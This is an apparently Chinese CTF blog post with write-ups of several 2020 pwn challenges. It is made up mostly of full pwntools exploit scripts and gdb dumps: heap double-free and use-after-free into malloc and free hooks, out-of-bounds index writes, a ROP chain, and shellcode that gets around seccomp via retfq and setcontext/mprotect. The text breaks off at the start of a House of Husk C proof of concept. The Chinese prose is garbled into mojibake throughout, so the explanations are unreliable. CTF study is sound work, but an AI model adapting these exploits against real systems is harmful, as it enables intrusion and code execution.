---
layout: post
title:  "2020Âπ¥ÁöÑPwnÁ≠æÂà∞È¢òÊòØ‰ªÄ‰πàÊ†∑ÁöÑ"
date:   2020-11-2
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# 2020Âπ¥ÁöÑPwnÁ≠æÂà∞È¢òÊòØ‰ªÄ‰πàÊ†∑ÁöÑ

ËÆ∞ÂΩï‰∏Ä‰∫õÁ≠æÂà∞È¢ò

## De1ctf2020 stl

list vector queue stack

add delete show

ÊØè‰∏™Âè™ËÉΩÂàõÂª∫‰∏§‰∏™

stack queueÁöÑdeleteÊòØÂá∫Ê†àÂá∫Èòü

stack queue‰∏çËÉΩshow

 ```c
vector 
pwndbg> x/20gx 0x8000000+0x207058
 0x0000000008419e90 
    
queue
pwndbg> x/20gx 0x8000000+0x207060
 0x0000000008419eb0
    
stack
pwndbg> x/20gx 0x8000000+0x207068
0x000000000841a170


vector
pwndbg> x/20gx 0x0000000008419e90 -0x10
0x8419e80:   0x0000000000000000   0x0000000000000021
0x8419e90:   0x000000000841a490   0x000000000841a490
0x8419ea0:   0x000000000841a4a0   0x0000000000000061


add0
pwndbg> x/20gx 0x0000000008419e90 -0x10
0x8419e80:   0x0000000000000000   0x0000000000000021
0x8419e90:   0x000000000841a490   0x000000000841a498
0x8419ea0:   0x000000000841a4a0   0x0000000000000061


add1
pwndbg> x/20gx 0x0000000008419e90 -0x10
0x8419e80:   0x0000000000000000   0x0000000000000021
0x8419e90:   0x000000000841a490   0x000000000841a4a0
0x8419ea0:   0x000000000841a4a0   0x0000000000000061

 
delete0
pwndbg> x/20gx 0x0000000008419e90 -0x10
0x8419e80:   0x0000000000000000   0x0000000000000021
0x8419e90:   0x000000000841a490   0x000000000841a498

 
delete1
pwndbg> x/20gx 0x0000000008419e90 -0x10
0x8419e80:   0x0000000000000000   0x0000000000000021
0x8419e90:   0x000000000841a490    0x000000000841a498
0x8419ea0:   0x000000000841a4a0   0x0000000000000061
    


ÂèëÁé∞ÂºÇÂ∏∏
ÂÜçÊ¨°delete0ÊàêÂäü
pwndbg> x/20gx 0x0000000008419e90 -0x10
0x8419e80:   0x0000000000000000   0x0000000000000021
0x8419e90:   0x000000000841a490   0x000000000841a490
0x8419ea0:   0x000000000841a4a0   0x0000000000000061
    


Âá∫double free
pwndbg> bin
tcachebins
0x20 [ 3]: 0x841a430 ‚Äî‚ñ∏ 0x841a470 ‚Äî‚ñ∏ 0x841a450 ‚óÇ‚Äî 0x0
0xa0 [ 3]: 0x841a5f0 ‚óÇ‚Äî 0x841a5f0
 ```

ÁªèÂÖ∏ double free

```python
from pwn import *
#r = process('./stl_container')
libc = ELF('/libc-2.27.so')
def add(tp,data):
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline(str(tp))
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline('1')
¬†¬†¬†¬†r.recvuntil('input data:')
¬†¬†¬†¬†r.send(data)

def delete(tp,index):
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline(str(tp))
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline('2')
¬†¬†¬†¬†r.recvuntil('index?')
¬†¬†¬†¬†r.sendline(str(index))

def show(tp,index):
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline(str(tp))
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline('3')
¬†¬†¬†¬†r.recvuntil('index?')
¬†¬†¬†¬†r.sendline(str(index))

def pop(tp):
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline(str(tp))
¬†¬†¬†¬†r.recvuntil('>>')
¬†¬†¬†¬†r.sendline('2')

def add_list(data):
¬†¬†¬†¬†add(1,data)
def delete_list(index):
¬†¬†¬†¬†delete(1,index)
def show_list(index):
¬†¬†¬†¬†show(1,index)

def add_vector(data):
¬†¬†¬†¬†add(2,data)
def delete_vector(index):
¬†¬†¬†¬†delete(2,index)
def show_vector(index):
¬†¬†¬†¬†show(2,index)

def add_queue(data):
¬†¬†¬†¬†add(3,data)
def pop_queue():
¬†¬†¬†¬†pop(3)

def add_stack(data):
¬†¬†¬†¬†add(4,data)
def pop_stack():
¬†¬†¬†¬†pop(4)

def fuck_addr(addr):
¬†¬†¬†¬†return addr-0x8408000

add_list('bbbb')
add_list('cccc')

add_stack('dddd')
add_stack('eeee')
add_queue('ffff')
add_queue('gggg')

add_vector('a')
add_vector('a')

pop_stack()
pop_stack()
pop_queue()
pop_queue()

delete_vector(0)
delete_vector(1)
show_vector(0)
r.recvuntil('data:')
leak = u64(r.recvline().strip().ljust(8,'\x00'))
log.info(hex(leak))
heap_base = leak-0x841a870+0x8408000
#heap_base = 0x8408000
log.success(hex(heap_base))
delete_vector(0)#uaf
#0x461

add_vector(p64(heap_base+fuck_addr(0x841a540)))

add_vector(p64(0)+p64(0x461))

delete_list(0)

delete_list(1)
add_list('cccc')
show_list(0)
r.recvuntil('data:')
leak = u64(r.recvline().strip().ljust(8,'\x00'))
libc_base = leak - 0x10-libc.sym['__malloc_hook']-96
malloc_hook = libc_base+libc.sym['__malloc_hook']
log.success(hex(libc_base))
log.success(hex(malloc_hook))
one = libc_base+0x4f322
add_queue(p64(malloc_hook)+'x'*8)
delete_list(0)
pop_queue()
pause()
add_stack(p64(malloc_hook))
pause()
add_stack(p64(one))

r.interactive()

```



## ÁΩëÈºéÊùØ boom1

È¢òÁõÆ‰∏∫‰∏Ä‰∏™cËØ≠Ë®ÄËß£ÈáäÂô®

ÂèØ‰ª•Ë∞ÉÁî®‰∏Ä‰∫õÂáΩÊï∞Ôºå‰ΩÜÊòØÊúâÈôêÂà∂

ÂÖ®Â±ÄÂèòÈáèqword_206010ÔºåÂàùÂßã‰∏∫1ÔºåË∞ÉÁî®ÂáΩÊï∞Âêé-1Ôºå‰∏çÁ≠â‰∫é1‰∏çËÉΩË∞ÉÁî®ÔºåÊâÄ‰ª•Âè™ËÉΩË∞ÉÁî®‰∏ÄÊ¨°ÂáΩÊï∞

Âú®ËøôÈáåÊàë‰ª¨‰πüÂèØ‰ª•ÁúãÂá∫ÂÖÅËÆ∏Ë∞ÉÁî®Âì™‰∫õÂáΩÊï∞

Âè™Ë∞ÉÁî®‰∏ÄÊ¨°ÂáΩÊï∞ËÇØÂÆöÊó†Ê≥ïgetshellÔºåÊâÄ‰ª•ÊúÄÈáçË¶ÅÁöÑÂ∞±ÊòØÂÆûÁé∞Â§öÊ¨°ÂáΩÊï∞Ë∞ÉÁî®Ôºå‰πüÂ∞±ÊòØË¶Å‰øÆÊîπÂÖ®Â±ÄÂèòÈáèqword_206010

Ëß£ÈáäÂô®ÂÖÅËÆ∏Êàë‰ª¨ÊâìÂç∞ÂèòÈáèÂú∞ÂùÄÔºåË∑üËøõÂèòÈáèÂú∞ÂùÄÂèëÁé∞ÔºåÈÄöËøáÂèòÈáèÂú∞ÂùÄÂÅöÂÅèÁßªÂèØ‰ª•ÊãøÂà∞Ê†àÊåáÈíà

Êúâ‰∫ÜÊ†àÊåáÈíàÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Ê≥ÑÈú≤Ê†à‰∏äÁöÑÊï∞ÊçÆÔºåÈÄöËøáÊ†à‰∏äÁöÑÊï∞ÊçÆÂèØ‰ª•Ê≥ÑÈú≤Âá∫Á®ãÂ∫èÂü∫ÂùÄÔºåÊúâ‰∫ÜÂü∫ÂùÄÂ∞±ÂèØ‰ª•Á°ÆÂÆöÂÖ®Â±ÄÂèòÈáèqword_206010ÁöÑÂú∞ÂùÄÔºå‰Ωøqword_206010ÂèØÊéßÔºåÊØèÊ¨°Ë∞ÉÁî®ÂáΩÊï∞ÂêéÊääÂÆÉÂÜçÊîπÂõû1Â∞±ÂèØ‰ª•ÂÆûÁé∞Â§öÊ¨°Ë∞ÉÁî®

ÂêåÊó∂Êàë‰ª¨‰πüÂèØ‰ª•Á°ÆÂÆögotË°®ÁöÑÂú∞ÂùÄÔºåÈÄöËøáÊ≥ÑÈú≤gotË°®ÔºåÊãøÂà∞libcÂü∫ÂùÄ

Êúâ‰∫ÜlibcÂü∫ÂùÄÔºåÊàë‰ª¨ÂèØ‰ª•Á°ÆÂÆöfree_hookÔºåone_gadgetÂú∞ÂùÄ

Â∞Üone_gadgetÂÜôÂÖ•free_hookÔºåË∞ÉÁî®freeÔºåÂç≥ÂèØgetshell

```python
from pwn import *
r = process('./pwn')
payload = '''
int main(){
int *a;
int *cnt;
int addr;
int libc_base;
int *leak;
int *free_hook_ptr;
char *p;
a=*(&a+3);
addr=*(a-5);
cnt=addr+0x2055a7;
leak=addr+0x20550f;
libc_base=*leak-0x6f690;
free_hook_ptr=libc_base+0x3c67a8;
*(free_hook_ptr)=libc_base+0x4526a;
*cnt=1;
p=malloc(0x60);
*cnt=1;
free(p);}
'''
r.recvuntil("I'm living...")
pause()
r.sendline(payload)

r.interactive()
```





## RCTF2020 note

Â≠òÂú®ÈùûÈ¢ÑÊúüÔºåindexÊ≤°È™å‰∏ãÁïåÔºåÂèØ‰ª•ËæìÂÖ•Ë¥üÊï∞Ôºå-5ÂèØÊ≥ÑÈú≤Á®ãÂ∫èÂü∫ÂùÄ„ÄÅÂ†ÜÂú∞ÂùÄ„ÄÅlibcÂú∞ÂùÄÔºåedit -5ÂèØ‰ª•Êîπchunk_storeÔºåÁõ¥Êé•ÊîπÊàêfreehookÁÑ∂ÂêéeditÂÜôonegadget

show edit edit free ÂΩ≥‰∫ç

È¢ÑÊúüËß£ÊòØtcache stashing unlinkÔºå‰ΩÜÊòØüë¥ÊáíÂæóÁúã

```python
from pwn import *

#r = process('./note')

def menu(choice):
¬†¬†¬†¬†r.recvuntil('Choice:')
¬†¬†¬†¬†r.sendline(str(choice))

def add(index,size):
¬†¬†¬†¬†menu(1)
¬†¬†¬†¬†r.recvuntil('Index: ')
¬†¬†¬†¬†r.sendline(str(index))
¬†¬†¬†¬†r.recvuntil('Size: ')
¬†¬†¬†¬†r.sendline(str(size))

def delete(index):
¬†¬†¬†¬†menu(2)
¬†¬†¬†¬†r.recvuntil('Index: ')
¬†¬†¬†¬†r.sendline(str(index))

def show(index):
¬†¬†¬†¬†menu(3)
¬†¬†¬†¬†r.recvuntil('Index: ')
¬†¬†¬†¬†r.sendline(str(index))

def edit(index,message):
¬†¬†¬†¬†menu(4)
¬†¬†¬†¬†r.recvuntil('Index: ')
¬†¬†¬†¬†r.sendline(str(index))
¬†¬†¬†¬†r.recvuntil('Message:')
¬†¬†¬†¬†r.sendline(message)


def gift(index,message):
¬†¬†¬†¬†menu(7)
¬†¬†¬†¬†r.recvuntil('Index: ')
¬†¬†¬†¬†r.sendline(str(index))
¬†¬†¬†¬†r.recvuntil('Message:')
¬†¬†¬†¬†r.sendline(message)
#x/64gx 0x555555554000+0x4080


#context.log_level='debug'
libc=ELF('./libc.so.6')
add(0,0)
show(-5)
leak= r.recvuntil('==========',drop=True)
print(leak.encode('hex'))
base = u64(leak[:8])-0x4008
log.success('base = '+hex(base))
stdout = u64(leak[24:32])
#log.success('stdout = '+hex(stdout))
stdin = u64(leak[40:48])
#log.success('stdin = '+hex(stdin))
stderr = u64(leak[56:64])
#log.success('stderr = '+hex(stderr))
heap_base = u64(leak[120:128])-0x260
log.success('heap_base = '+hex(heap_base))

libc_base = stdout -libc.sym['_IO_2_1_stdout_']
log.success('libc_base = '+hex(libc_base))
payload = leak[:8]+p64(0xffffffff)+p64(0xff)
payload += p64(stdout)+p64(0)
payload += p64(stdin)+p64(0)
payload += p64(stderr)+p64(0)
payload += p64(0)*6
payload += p64(libc_base+libc.sym['__free_hook'])+p64(0xff)+p64(0xff)
edit(-5,payload)
one = libc_base+0xe2383
edit(0,p64(one))
free(0)
#-5 -21 -27 -33
r.interactive()
```





## RCTF2020 bf

bf Ëß£ÈáäÂô®

ÁªèÂÖ∏ÊåáÈíàÁûéÂá†Êää‚òû

```python
from pwn import *
#r = process('./bf')
elf = ELF('./bf')
libc = ELF('./libc.so.6')

payload  = '+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++++ +++++ .<+++ +[->- ---<]>---. <+++[ ->+++ <]>+. -.--- ----- -.<'
r.recvuntil('enter your code:')
r.sendline('+[>+++++++++].,')
r.recvuntil('running....\n')
low = r.recv(1)
print(ord(low))
r.send(chr(ord(low)-5+0x10+0x8))#f8

r.recvuntil('done! your code: ')

canary = u64(r.recv(8))
log.success(hex(canary))

stack = u64(r.recv(8).strip().ljust(8,'\x00'))
log.success(hex(stack))

r.send('y')
r.sendline('+[>+].,'+'a'*0x10)
r.send(chr(ord(low)-5+0x10+0x8+0x7))#ff
r.recvuntil('aaaaaaaaaaaaaaaa')
leak_base = u64(r.recv(8)[1:].strip().ljust(8,'\x00'))
base = leak_base-0x4980
log.success(hex(base))
main = base+0x1684
r.send('y')
r.sendline('+[>+-]')

r.send('y')
r.sendline('+[>--]')
r.send('y')
r.sendline('+[>-]')
r.send('y')
r.sendline('+[>-]')


fuck = base+0x19DD
main = base+0x1684
start = base+0x1420

puts_plt = base+elf.plt['puts']
puts_got = base+elf.got['puts']
read_plt = base+elf.plt['read']
write_plt = base+elf.plt['write']
pop_rsi_r15 = base+0x49e1
pop_rdi = base+0x49e3 
pop3_ret = base+0x416f
fuck_rdx = base+0x21a6
#break *(0x21a6+0x555555554000)
#0x00000000000021a6 : mov rdx, qword ptr [rbp - 0x10] ; mov qword ptr [rax], rdx ; nop ; pop rbp ; ret


log.info(hex(fuck))
r.send('y')
payload = p64(canary)+p64(stack)+p64(0)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)

payload += p64(pop3_ret)+p64(stack-96+0x10)*3
payload += p64(fuck_rdx)+p64(0)
payload += p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(stack-96)+p64(0)+p64(read_plt)
payload += p64(0x400)

r.sendline(payload)


r.send('y')
r.sendline(p64(canary)+'+[>'+'-'*11+']')

r.send('y')
r.sendline('+[>'+'-'*5+']')

r.send('y')
r.sendline('+[>'+'-'*3+']')
r.send('y')
r.sendline('+[>'+'-'+']')
r.send('y')
r.sendline('+'*0xe+'\x00')
#gdb.attach(r)
r.send('n')
r.recvuntil('++++++++++++++\x00\nwant to continue?\n')
libc_base = u64(r.recv(6).ljust(8,'\x00'))-libc.sym['puts']
log.success(hex(libc_base))

open_addr = libc_base + libc.sym['open']
pop_rdx = libc_base+0x1b96
pop_rsi = libc_base+0x23e6a

bss=base+elf.bss()+0x50
payload = p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x60)+p64(read_plt)
payload += p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(open_addr)+p64(pop_rdi)
payload += p64(3)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x60)+p64(read_plt)
payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x60)+p64(write_plt)
r.sendline(payload)
r.sendline('./flag\x00')
r.interactive()

```



## sctf2020 coolcode

Ê≤°ÂºÄNXÔºå‰∏ÄÂ†ÜRWXÊÆµÔºåÊòéÁ§∫shellcode

ÊúâÊ≤ôÁÆ±ÔºåÁ¶ÅÁî®openÔºåÈúÄË¶ÅÂà©Áî®retfqÂàáÊç¢Âà∞32‰Ωç

add index‰∏∫ÊúâÁ¨¶Âè∑Êï∞ÔºåÂèØ‰ª•ËæìÂÖ•Ë¥üÊï∞Ë∂äÁïåË¶ÜÁõñËÆ°Êï∞ÂíågotË°®

add‰∏≠ËæìÂÖ•messageÊúâcheckÔºåÂÖàÂêëÊ†à‰∏≠ÂÜôÂÖ•ÔºåcheckÂêéÂÜçÈÄöËøástrncpyÊã∑Ë¥ùÂà∞Â†Ü‰∏≠Ôºåcheck‰∏çËøáÁõ¥Êé•exitcheck‰∏≠Ê£ÄÊµãÁöÑÂ≠óËäÇÊï∞ÊòØËæìÂÖ•Â≠óËäÇÊï∞-1ÔºåËæìÂÖ•ÁöÑÊúÄÂêé‰∏ÄÂ≠óËäÇ‰∏çÈúÄË¶ÅcheckÔºåÂèØ‰ª•Áî≥ËØ∑Âà∞-22ÔºåË¶ÜÁõñexit_gotÔºåchunk‰∏≠ÂÜô‰∏Ä‰∏™\xc3ÔºåÊâßË°åexitÂ∞±‰ºöÁõ¥Êé•retÔºåÁªïËøácheck

Ê≠§Êó∂shellcode‰ªçÁÑ∂ÊúâÈôêÂà∂ÔºåÁî±‰∫é‰ΩøÁî®strncpyÔºåshellcode‰∏≠‰∏çËÉΩÊúâ\x00ÊâìÂç∞chunkÊï∞ÊçÆÊó∂Ë∞ÉÁî®‰∫ÜwriteÔºåË¶ÜÁõñwrite_gotÔºårsiÂ∑≤ÁªèÂ∏ÉÁΩÆÂ•ΩÔºåÂèØ‰ª•ÂæàÊñπ‰æøÁöÑÈÄöËøáshellcodeÊâßË°åreadÁ≥ªÁªüË∞ÉÁî®ÔºåÂêëchunk‰∏≠ÂÜôÂÖ•‰ªªÊÑèÊï∞ÊçÆ

ÊèêÂâçË¶ÜÁõñfree_gotÔºåÈÄöËøáÊâßË°åwrite_gotÊåáÂêëÁöÑshellcodeË¶ÜÁõñfree_gotÊåáÂêëÁöÑchunk‰∏≠ÁöÑshellcodeÔºåÂèØ‰ª•‰ªªÊÑèÂÜôÂÖ•shellcode

free_gotÊåáÂêëÁöÑshellcode‰∏≠‰∏§Ê¨°readÁ≥ªÁªüË∞ÉÁî®ÂàÜÂà´ÂÜôÂÖ•32‰ΩçopenÂíå‰∏Ä‰∏™64‰ΩçreadwriteÁöÑshellcodeÔºåÁÑ∂ÂêéretfqÔºåË∑≥Âà∞32‰ΩçopenÁöÑshellcode

openÊâßË°åÂÆåÂêéË∑≥Âõû64‰ΩçÔºåÊâßË°åreadwriteÔºåÂæóÂà∞flag

```python
from pwn import *
#r = process('./coolcode')
def add(index,mes):
	r.recvuntil(' Your choice :')
	r.sendline('1')
	r.recvuntil('Index:')
	r.sendline(str(index))
	r.recvuntil('messages:')
	r.send(mes)

def show(index):
	r.recvuntil(' Your choice :')
	r.sendline('2')
	r.recvuntil('Index:')
	r.sendline(str(index))

def delete(index):
	r.recvuntil(' Your choice :')
	r.sendline('3')
	r.recvuntil('Index:')
	r.sendline(str(index))

def shell64(shellcode):
	shell_asm = asm(shellcode,arch='amd64')
	print(shell_asm.encode('hex'))
	return shell_asm
def shell32(shellcode):
	shell_asm = asm(shellcode,arch='i386')
	print(shell_asm.encode('hex'))
	return shell_asm


add(-22,'\xc3')#exit_got
shellcode_64_free_read = '''
mov rsi,rdi
mov rdx,rdi
xor rdi,rdi
xor rax,rax
syscall
ret
'''
add(0,'1'*8)#overflow
add(-3,'1'*8)#clean cnt
add(-37,shell64(shellcode_64_free_read))#free_got 0x6039c0
shellcode_64_write_read = '''
dec rdi
mov rdx,rsi
mov rax,rdi
syscall
ret
'''
add(-3,'1'*8)#clean cnt
add(1,'1'*8)#padding
add(-3,'1'*8)#clean cnt
add(1,'1'*8)#padding
add(-3,'1'*8)#clean cnt
add(-34,shell64(shellcode_64_write_read))#write_got

show(0)
shellcode_64_free_read = '''
xor rdi,rdi
xor rax,rax
mov rsi,0x602300
mov rdx,0x200
syscall
xor rdi,rdi
xor rax,rax
mov rsi,0x602400
mov rdx,0x200
syscall
push 0x23
push 0x602308
retfq
'''
payload = 'a'*0x20+p64(0)+p64(0x31)+'a'*0x20+p64(0)+p64(0x31)+shell64(shellcode_64_free_read)
r.sendline(payload)

delete(2)
pause()
flag = 'flag\x00\x00\x00\x00'
binsh = '/bin/sh\x00'

open_32 = '''
xor eax,eax
mov eax,0x5
mov ebx,0x602300
xor ecx,ecx
int 0x80
jmp 0x33:0x602400
ret
'''

read_64 = '''
mov rdi,3
mov rsi,0x602500
mov rdx,0x50
xor rax,rax
syscall
mov rdi,1
mov rsi,0x602500
mov rdx,0x50
mov rax,1
syscall
ret
'''
r.sendline(flag+shell32(open_32)+'\x00')
r.sendline(shell64(read_64)+'\x00')

r.interactive()

```



## snake

Ê≠ª‰∫Ü‰πãÂêéÁïôË®ÄÔºåÂºÄÂßãÁïôË®ÄÁöÑ‰ΩçÁΩÆÁî±ËõáÊ≠ªÁöÑ‰ΩçÁΩÆÂÜ≥ÂÆöÔºåÊ≠ªÂú®Âè≥‰∏ãËßíindexÊúÄÂ§ßÔºåÊ≠§Êó∂ÁïôË®ÄÂèØ‰ª•Ë¶ÜÁõñÂà∞‰∏ã‰∏Ä‰∏™chunkÁöÑsize

ËõáÂºÄÂ±ÄÂè≥‰∏äËßí‰∏ÄË∑ØÂêë‰∏ãÔºåÊåâsÁ≠âÊ≠ªÂ∞±Ë°åËõáÊ≠ª‰∫Ü‰πãÂêéÊúâ‰∏ÄÂ†ÜÂØπnameÁöÑÊìç‰ΩúÔºågetnameÊää‰∏Ä‰∏™ÊåáÈíàËµãÁªôbufÔºåÂ≠òÂú®uafÔºåÊ∏∏Êàè‰∏≠ÊâìÂç∞playernameÂèØ‰ª•leak

ÁïôË®ÄË¶ÜÁõñsizeÔºå‰º™ÈÄ†Âá∫unsorted binÔºåÂêåÊó∂ÈÄ†ÊàêoverlappingÔºåÂà©Áî®getnameÊ≥ÑÈú≤libc„ÄÇ

Âà©Áî®overlapping‰øÆÊîπ‰∏Ä‰∏™chunk sizeÔºåÁÑ∂ÂêéË¶ÜÁõñfdÔºåfastbin attackÊâìmalloc_hook

```python
from pwn import *
#r = process('./snake')
elf = ELF('./snake')
libc = ELF('/libc-2.23.so')
def init_name(size,name):
	r.recvuntil('how long?')
	r.sendline(str(size))
	r.recvuntil('input name')
	r.sendline(name)


def menu(x):
	r.recvuntil('4.start name')
	r.sendline(str(x))


def add_name(index,size,name):
	menu(1)
	r.recvuntil('index?')
	r.sendline(str(index))
	r.recvuntil('how long?')
	r.sendline(str(size))
	r.recvuntil('name?')
	r.sendline(name)


def delete(index):
	menu(2)
	r.recvuntil('index?')
	r.sendline(str(index))


def get_name(index):
	menu(3)
	r.recvuntil('index?')
	r.sendline(str(index))


def start():
	menu(4)


def leave(word):
	r.recvuntil('words:')
	r.send(word)
	r.recvuntil('exit?')
	r.sendline('n')


def white_give():
	for i in range(0x23):
		r.send('s')
pause()
context.log_level = 'debug'
init_name(0x20,'aaaa')

r.sendline('')
white_give()

leave('aaaa')
add_name(1,0x20,'aaaa')
add_name(2,0x50,'aaaa')
add_name(3,0x20,'aaaa')
add_name(4,0x20,'aaaa')
add_name(5,0x20,'aaaa')
add_name(6,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')

delete(5)
delete(6)
get_name(5)
start()
r.recvuntil('player name:')
leak = u64(r.recvuntil('\t',drop=True).strip(' ').ljust(8,'\x00'))
log.success(hex(leak))
white_give()
leave('1'*0x4c+'\xf1')
delete(0)
add_name(7,0x20,'aaaa')
add_name(7,0x20,'aaaa')
add_name(8,0x20,'aaaa')

get_name(1)
start()
r.recvuntil('player name:')
leak = u64(r.recvuntil('\t',drop=True).strip(' ').ljust(8,'\x00'))
libc_base = leak - 0x10-libc.sym['__malloc_hook']-0x58
white_give()
malloc_hook = libc_base + libc.sym['__malloc_hook']
one = libc_base+ 0xf1147

leave('a')

add_name(7,0x40,'a'*0x20+p64(0)+p64(0x71))
add_name(9,0x60,(p64(0)+p64(0x21))*6)

delete(2)
delete(7)
add_name(7,0x40,'a'*0x20+p64(0)+p64(0x71)+p64(malloc_hook-0x13))

add_name(9,0x68,'a'*0x3+p64(one))
add_name(9,0x68,'a'*0x3+p64(one))

log.success(hex(libc_base))
log.success(malloc_hook)
log.success(hex(libc_base))

r.interactive()

```



## CCISC2020 Âçé‰∏úÂåóPwn4

merge Â§Ñ‰ΩøÁî®‰∫Ü strcpy Âíå strcatÔºåÂêàÂπ∂Êó∂‰ºöËøûÁùÄ‰∏ã‰∏Ä‰∏™chunkÁöÑsize‰∏ÄËµ∑strcpyÔºåÈÖçÂêàstrcatÂèØ‰ª•off-by-oneÔºå‰øÆÊîπ‰∏Ä‰∏™chunksizeÔºåÈÄ†Êàêheap overlaping

Âà©Áî® merge ÊãøÂà∞Â§ßchunkÔºåfree ÂæóÂà∞unsorted binÔºåÊ≥ÑÈú≤libc

ÂºÄ‰∫ÜÊ≤ôÁÆ±ÔºåÂèØ‰ª•Âà©Áî®setcontextÊâßË°åshellcodeÔºåorwÊãøflagÔºåÂèÇËÄÉËøôÁØá[ÂçöÂÆ¢](https://surager.github.io/_posts/2020-06-27-%E4%BB%8EDASCTF6%E6%9C%88%E8%B5%9B%E4%B8%AD%E5%AD%A6%E4%B9%A0setcontext%E7%BB%95%E8%BF%87seccomp/)

1. Â∞Ü`setcontext+53`ÂÜôÂÖ•`__free_hook`Ôºå`__free_hook+0x8`ÂÜôÂÖ•‰∏Ä‰∏™`__free_hook+0x10`ÔºåÂêéÈù¢ÂÜô`read;jmp rsi`ÁöÑ`shellcode`„ÄÇ

2. ÊûÑÈÄ†`frame`ÔºåripËÆæÁΩÆÊàê`mprotect`ÔºåÂáÜÂ§áÂ∞Ü`__free_hook&0xfffffffffffff000`‰πãÂêéÁöÑËøûÁª≠0x1000Âå∫ÂüüÊùÉÈôêËÆæÁΩÆÊàê7„ÄÇÊâæ‰∏Ä‰∏™Â†ÜÂùóÂ≠òÊîæ`frame`„ÄÇ

   ```
   frame = SigreturnFrame()
   frame.rip = 0 // setcontext‰πãÂêéÊâßË°åÁöÑÂÄº
   frame.rdi = 0
   frame.rsi = 0
   frame.rdx = 0 // 3‰∏™ÂèÇÊï∞
   frame.rsp = 0 // ripÊâßË°åÂÆå‰πãÂêéÊâßË°åÁöÑÂÄº
   frame.rax = 0
   ```

3. ÈáäÊîæÂ≠òÊîæ`frame`ÁöÑ`chunk`ÔºåÊ≠§Êó∂ÊâßË°åÂà∞`read`„ÄÇ

4. Â∞Ü‰∫ãÂÖàÂáÜÂ§áÂ•ΩÁöÑ`getflag`ÁöÑ`shellcode`ÂèëÈÄÅÂà∞ÊúçÂä°Âô®ÔºåÂç≥ÊâßË°å`shellcode`ÔºåÂæóÂà∞flag„ÄÇ

```python
from pwn import *

#r = process('./pwn')
def menu(choice):
    r.recvuntil('>>>')
    r.sendline(str(choice))

def add(size,content):
    menu(1)
    r.recvuntil('size:')
    r.sendline(str(size))
    r.recvuntil('content')
    r.send(content)

def delete(index):
    menu(2)
    r.recvuntil('index:')
    r.sendline(str(index))

def view(index):
    menu(3)
    r.recvuntil('index:')
    r.sendline(str(index))

def edit(index,content):
    menu(4)
    r.recvuntil('index:')
    r.sendline(str(index))
    r.recvuntil('content')
    r.send(content)

def merge(index1,index2,index3):
    menu(5)
    r.recvuntil('src index 1:')
    r.sendline(str(index1))
    r.recvuntil('src index 2:')
    r.sendline(str(index2))
    r.recvuntil('dst index:')
    r.sendline(str(index3))



add(0x100,'a')
merge(0,0,1)
merge(1,1,2)
merge(2,2,3)
delete(3)
add(0x20,'a')#8
edit(3,'a'*8)
view(3)
r.recvuntil('a'*8)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x3ec190
free_hook = libc_base + 0x3ed8e8
log.success(hex(libc_base))
log.success(hex(free_hook))
add(0x80,'aaaa')#4
add(0x28,'a'*0x28)#5
add(0x60,'b'*0x5f+'\xa1/')#6
add(0x28,'a'*0x28)#7
delete(4)
merge(5,6,8)
delete(8)
delete(6)

add(0x90,p64(0)*3+p64(0x31)+p64(0)*5+p64(0x21)+p64(0)*3+p64(0x71)+p64(free_hook))#7

setcontext = libc_base+0x52110

newexe = free_hook & 0xfffffffffffff000
context.arch = 'amd64'
shell1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
''' % newexe
payload = p64(setcontext+53) + p64(free_hook+0x18)*2 + asm(shell1)
add(0x60,'aaaa')
add(0x60,payload)

mprotect = libc_base+1162240
log.success(hex(mprotect))
frame = SigreturnFrame()
frame.rsp = free_hook+0x10
frame.rdi = newexe
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
frame.rip = mprotect
print(len(frame))



flag = '/flag\x00\x00\x00'
shell2 = '''
mov rax,%s
push rax

mov rdi,0
mov rsi,rsp
mov rdx,0
mov rax,257
syscall

mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall

mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall

mov rdi,0
mov rax,60
syscall
''' % hex(u64(flag))

add(0x100,str(frame))

delete(9)
pause()

r.sendline(asm(shell2))
r.interactive()
```



## CCISC2020 Âçé‰∏úÂåóPwn5

uafÔºåÂèØÁî≥ËØ∑ËæÉÂ§ßsizeÔºåÊòæÁÑ∂ÊòØË£∏ÁöÑhouse of huskÔºåÁõ¥Êé•ÁÖßÁùÄpocÊîπÂ∞±Ë°å‰∫ÜÔºåÈæôÈ∏£Ôºåüë¥Áõ¥Êé•‰∏ÄË°Ä

ÊúâÁöÑÈòü‰ºçÂç°Âà∞ libc ‰∫ÜÔºåüë¥Áõ¥Êé•Áõ≤ÁåúÔºåÈò¥Èó¥ËßÅÂæóÂ§ö‰∫ÜÂ∞±ÊàêÈò≥Èó¥‰∫Ü„ÄÇ

poc

```c
/**
* This is a Proof-of-Concept for House of Husk
* This PoC is supposed to be run with libc-2.27.
*/
#include <stdio.h>
#include <stdlib.h>
